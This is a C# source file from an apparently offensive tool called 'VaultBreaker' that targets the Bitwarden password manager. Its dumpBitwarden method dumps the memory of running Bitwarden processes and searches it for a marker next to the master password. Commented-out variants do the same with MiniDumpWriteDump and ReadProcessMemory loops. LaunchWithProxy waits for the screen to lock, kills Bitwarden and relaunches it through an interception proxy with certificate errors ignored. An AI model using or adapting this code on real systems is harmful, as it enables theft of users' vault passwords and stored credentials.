using System;
using System.Diagnostics;
using VaultBreaker.Helpers;

namespace VaultBreaker.Core
{
	public class BitWarden
	{
		/**
		public static void dumpBitwarden(string outFile)
		{
			//Process[] procs = Process.GetProcessesByName("Bitwarden.exe");
			Process[] procs = Process.GetProcessesByName("BiTWarDen");
			Console.WriteLine("[DEBUG] Number of Processes Found: {0}", procs.Length);

			foreach (var proc in procs)
			{
				//IntPtr hFile = WinAPI.CreateFileW(outFile + "Bitwarden.DMP", System.IO.FileAccess.ReadWrite, System.IO.FileShare.ReadWrite, IntPtr.Zero, System.IO.FileMode.Create, System.IO.FileAttributes.Normal, IntPtr.Zero);
				//if(hFile == IntPtr.Zero)
				//{
				//	Console.WriteLine("[DEBUG] Something went wrong while writing the file");
				//	Console.ReadKey();
				//}
				//else
				//{
				//	Console.WriteLine("[DEBUG] Got Handle {0}", hFile.ToString());
				//	Console.ReadKey();
				//}
				IntPtr hProc = proc.Handle;
				//Requires writing to file :/
				FileStream fs = null;

				if (File.Exists(outFile + "\\BW.DMP"))
				{
					fs = File.OpenWrite(outFile + "\\BW.DMP");
				}
				else
				{
					fs = File.Create(outFile + "\\BW.DMP");
				}
				using (fs)
				{
					Console.WriteLine("[DEBUG]\r\nhProc {0}\r\nprocID {1}\r\nfs {2}", hProc.ToString(), proc.Id, fs.SafeFileHandle.DangerousGetHandle().ToString());
					Console.ReadKey();
					WinAPI.MiniDumpWriteDump(hProc, (uint)proc.Id, fs.SafeFileHandle.DangerousGetHandle(), WinAPI.MINI_DUMP_TYPE.WithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
				}

				Console.ReadKey();
			}
		}
	**/

		public static void dumpBitwarden()
		{
			//Process[] procs = Process.GetProcessesByName("Bitwarden.exe");
			Process[] procs = Process.GetProcessesByName("BiTWarDen");
			Console.WriteLine("[DEBUG] Number of Processes Found: {0}", procs.Length);
			foreach (var proc in procs)
			{
				#region oldcode
				/**
				//IntPtr hProc = proc.Handle;
				IntPtr hProc = WinAPI.OpenProcess(WinAPI.ProcessAccessFlags.QueryInformation|WinAPI.ProcessAccessFlags.VirtualMemoryRead, false, proc.Id);
				WinAPI.MEMORY_BASIC_INFORMATION64 mbi = new WinAPI.MEMORY_BASIC_INFORMATION64();
				//32 bit
				//WinAPI.MEMORY_BASIC_INFORMATION mbi = new WinAPI.MEMORY_BASIC_INFORMATION()
				WinAPI.SYSTEM_INFO si = new WinAPI.SYSTEM_INFO();
				if(hProc == IntPtr.Zero)
				{
					//Failed.
					Console.WriteLine("Unable to create a connection to the process! Error Code: {0}", WinAPI.GetLastError());
					Environment.Exit(6);
				}




				WinAPI.GetSystemInfo(out si);
				IntPtr hProc_min_addr = si.minimumApplicationAddress;
				IntPtr hProc_max_addr = si.maximumApplicationAddress;
				long hProc_long_min = (long)hProc_min_addr;
				long hProc_long_max = (long)hProc_max_addr;
				string fileName = "dump-" + proc.Id + "-" + proc.ProcessName + "-2.txt";
				StreamWriter sw = new StreamWriter(fileName);

				int bytesRead = 0;

				//Console.WriteLine("[DEBUG] hProc_long_min {0}\r\n[DEBUG] hProc_long_max {1}", hProc_long_min, hProc_long_max);
				while (hProc_long_min < hProc_long_max)
				{
					//Console.WriteLine("[DEBUG] Current Min Addr: {0}", hProc_long_min);\
					//DebugFunctions.writeDebug("Performing VirtualQueryEx()");
					bytesRead = WinAPI.VirtualQueryEx(hProc, hProc_min_addr, out mbi, (uint)Marshal.SizeOf(typeof(WinAPI.MEMORY_BASIC_INFORMATION64)));
					//DebugFunctions.writeDebug("Finished VirtualQueryEx()");
					//if (mbi.Protect == (int)WinAPI.AllocationProtectEnum.PAGE_EXECUTE_READWRITE && mbi.State == WinAPI.StateEnum.MEM_COMMIT)


					//Console.WriteLine("mbi.Protect : {0}\r\nmbi.State {1}", mbi.Protect, mbi.State);
					//if(mbi.Protect == (int)WinAPI.AllocationProtectEnum.PAGE_EXECUTE_READWRITE && mbi.State == (int)WinAPI.StateEnum.MEM_COMMIT)
					if (mbi.Protect == WinAPI.PAGE_READWRITE && mbi.State == WinAPI.MEM_COMMIT)
					{
						byte[] buffer = new byte[mbi.RegionSize];
						//DebugFunctions.writeDebug("Reading Process Memory");
						WinAPI.ReadProcessMemory(hProc, mbi.BaseAddress, buffer, mbi.RegionSize, ref bytesRead);
						//Console.WriteLine("[DEBUG] mbi.RegionSize: {0}", mbi.RegionSize);
						for(long i=0; i < mbi.RegionSize; i++)
						{
							//sw.WriteLine("0x{0} : {1}", mbi.BaseAddress + i.ToString("X"), (char)buffer[i]);
							sw.Write((char)buffer[i]);
						}
					}
					else
					{
						if (mbi.Protect == WinAPI.PAGE_READWRITE)
						{
							//DebugFunctions.writeDebug("mbi.Protect == PAGE_READWRITE");
						}
						else if (mbi.RegionSize == WinAPI.MEM_COMMIT)
						{
							//Console.WriteLine("mbi.RegionSize == MEM_COMMIT");
						}
						else
						{
							//DebugFunctions.writeDebug("An error occured: " + WinAPI.GetLastError());
							//DebugFunctions.writeDebug("bytesRead: " + bytesRead);
							//DebugFunctions.writeDebug("Exiting, press any key to Continue.");
							//Console.ReadKey();
							//Environment.Exit(24);
						}
					}
					//Console.WriteLine("[DEBUG] Finished Memory Location");
					//Console.WriteLine("[DEBUG] Adding {0} to hProc_long_min. Current Value: {1}", mbi.RegionSize, hProc_long_min + mbi.RegionSize);
					hProc_long_min += mbi.RegionSize;
					hProc_min_addr = new IntPtr(hProc_long_min);
				}
				sw.Close();
				**/
				#endregion

				string strResult = MemoryHelper.dumpProcessMemory(proc);
				//var matches = Regex.Matches(strResult, "offline_access").Cast<Match>().Select(m => m.Index);
				//foreach (var match in matches)
				//{
				//	Console.WriteLine(match);
				//}
				//Maybe convert this to a regex. Shouldn't take a long time and end with a cleaner result.
				if (strResult.Contains("\"amr\":[\"Application\"]}"))
				{
					int start, end;
					//start = strResult.IndexOf("\"amr\":[\"Application\"]}", 0) + 22;
					start = strResult.IndexOf("\"amr\":[\"Application\"]}", 0);
					end = start + 100;
					Console.WriteLine("[SUCCESS] Potential Bitwarden Password Location found! {0}",strResult.Substring(start, end - start).Split('\0')[1]);
				}
				else
				{
					Console.WriteLine("Didn't Find");
				}
				Console.WriteLine("Fin. Press any key to exit");
				Console.ReadKey();
			}
		}

		public static void LaunchWithProxy(bool force)
		{

			//Check if screen is locked.
			if (!force)
			{
				DebugFunctions.writeDebug("Waiting for Screen to lock before bouncing application");
				Monitoring.CheckForWorkstationLocking workLock = new Monitoring.CheckForWorkstationLocking();

				workLock.Run();

				Console.WriteLine("Press ESC to exit...");
				while (!workLock.screenLocked)
				{
					//wait a bit before checking again.
					System.Threading.Thread.Sleep(10000);
				};
				DebugFunctions.writeDebug("Screen lock notification recieved, continuing.");
			}
			string procPath = "";
			Process[] procs = Process.GetProcessesByName("Bitwarden");
			if(procs.Length < 1)
			{
				DebugFunctions.writeDebug("No Processes found");
			}
			foreach(var proc in procs)
			{
				if (procPath == "")
				{
					procPath = proc.MainModule.FileName;
					DebugFunctions.writeDebug("Getting Process Path: " + procPath);
				}
				//Kill All current Running Processes.
				proc.Kill();
			}
			DebugFunctions.writeDebug("Starting Process with New Arguments");
			Process bw = new Process();
			bw.StartInfo.FileName=procPath;
			bw.StartInfo.Arguments = "--proxy-server=http://127.0.0.1:8888 --ignore-certificate-errors";
			bw.Start();
		}
	}
}
